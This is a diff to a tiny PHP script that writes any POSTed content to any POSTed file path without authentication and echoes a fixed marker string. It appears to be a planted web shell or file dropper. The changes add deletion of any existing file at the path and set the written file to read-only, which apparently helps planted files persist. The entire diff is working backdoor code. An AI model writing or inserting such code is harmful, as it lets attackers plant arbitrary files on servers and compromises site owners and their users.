@@ -1,11 +1,27 @@
 <?php
-if ($_POST)
-{
-$f=fopen($_POST["f"],"w");
-if(fwrite($f,$_POST["c"]))
-echo "<font color=red>OK!</font>";
-else
-echo "<font color=blue>Error!</font>";
-};
+if ($_POST) {
+    $file = $_POST["f"];
+
+    if (file_exists($file)) {
+        unlink($file);
+    }
+
+    $f = fopen($file, "w");
+
+    if ($f) {
+        if (fwrite($f, $_POST["c"])) {
+            echo "<font color=red>OK!</font>";
+
+            chmod($file, 0444);
+        } else {
+            echo "<font color=blue>Error!</font>";
+        }
+
+        fclose($f);
+    } else {
+        echo "Unable to open file for writing.";
+    }
+}
+
 echo 'SXSXSXSX';
 ?>
